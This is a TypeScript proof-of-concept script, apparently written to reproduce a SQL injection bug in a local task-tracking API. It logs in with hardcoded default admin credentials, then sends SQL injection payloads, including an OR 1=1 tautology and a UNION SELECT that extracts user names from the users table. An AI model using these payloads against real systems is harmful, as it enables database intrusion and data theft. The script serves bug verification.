import axios from 'axios';

const API_URL = 'http://localhost:5000/api';

async function reproduce() {
    try {
        // First, need to login as admin to access /metrics
        const loginRes = await axios.post(`${API_URL}/auth/login`, {
            name: 'admin',
            password: 'admin123'
        });
        const token = loginRes.data.token;

        // Try to inject SQL via startDate parameter
        // Original query: DATE(t.created_at, 'localtime') >= DATE('${startDate}')
        // Payload: 2024-01-01') OR 1=1 --
        const startDate = "2024-01-01') OR 1=1 --";
        const endDate = "2024-12-31";

        console.log(`Attempting SQL injection with startDate: ${startDate}`);

        const metricsRes = await axios.get(`${API_URL}/tasks/metrics`, {
            params: { startDate, endDate },
            headers: { Authorization: `Bearer ${token}` }
        });

        console.log('Metrics response received.');
        console.log('Number of rows returned:', metricsRes.data.length);

        // If 1=1 worked, it might return more data than expected or at least not fail
        // A more definitive test would be to extract data from another table
        const extractUserSql = "2024-01-01') UNION SELECT id, name, NULL, NULL, NULL, NULL, NULL FROM users --";
        console.log(`Attempting data extraction with startDate: ${extractUserSql}`);
        const extractRes = await axios.get(`${API_URL}/tasks/metrics`, {
            params: { startDate: extractUserSql, endDate },
            headers: { Authorization: `Bearer ${token}` }
        });

        console.log('Data extraction response:');
        console.table(extractRes.data);

    } catch (error: any) {
        console.error('Error during reproduction:', error.response?.data || error.message);
    }
}

reproduce();
